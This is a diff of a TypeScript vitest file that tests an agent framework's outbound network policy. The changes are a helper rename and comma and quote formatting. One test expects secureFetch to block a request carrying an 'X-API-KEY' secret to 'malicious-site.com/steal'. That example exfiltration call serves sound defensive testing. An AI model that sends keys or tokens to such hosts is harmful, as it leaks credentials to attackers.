@@ -1,7 +1,7 @@
 import { afterAll, beforeEach, describe, expect, it, vi } from 'vitest';
 import axios from 'axios';
 import { secureFetch } from '@agent/core';
-import { resetEgressPolicyCache } from '@agent/core/egress-policy';
+import { _resetEgressPolicyCacheForTests } from '@agent/core/egress-policy';
 
 vi.mock('axios', () => ({
   default: vi.fn(),
@@ -18,19 +18,19 @@ describe('Network Governance Policy Enforcement', () => {
   afterAll(() => {
     if (originalEgressMode === undefined) delete process.env.KYBERION_EGRESS_POLICY;
     else process.env.KYBERION_EGRESS_POLICY = originalEgressMode;
-    resetEgressPolicyCache();
+    _resetEgressPolicyCacheForTests();
   });
 
   function setEgressMode(mode: 'enforce' | 'warn'): void {
     process.env.KYBERION_EGRESS_POLICY = mode;
-    resetEgressPolicyCache();
+    _resetEgressPolicyCacheForTests();
   }
 
   it('Scenario: Request to allowlisted domain (Allowed under enforce)', async () => {
     setEgressMode('enforce');
     const result = await secureFetch({
       url: 'https://api.github.com/user',
-      headers: { 'Authorization': 'Bearer test-token' }
+      headers: { Authorization: 'Bearer test-token' },
     });
     expect(result.success).toBe(true);
   });
@@ -40,7 +40,7 @@ describe('Network Governance Policy Enforcement', () => {
     try {
       await secureFetch({
         url: 'https://malicious-site.com/steal',
-        headers: { 'X-API-KEY': 'secret-key' }
+        headers: { 'X-API-KEY': 'secret-key' },
       });
       throw new Error('Should have been blocked');
     } catch (err: any) {
@@ -51,7 +51,7 @@ describe('Network Governance Policy Enforcement', () => {
   it('Scenario: Request to non-allowlisted domain (Allowed in warn observation mode, SA-04)', async () => {
     setEgressMode('warn');
     const result = await secureFetch({
-      url: 'https://any-public-site.com/data'
+      url: 'https://any-public-site.com/data',
     });
     expect(result.success).toBe(true);
   });
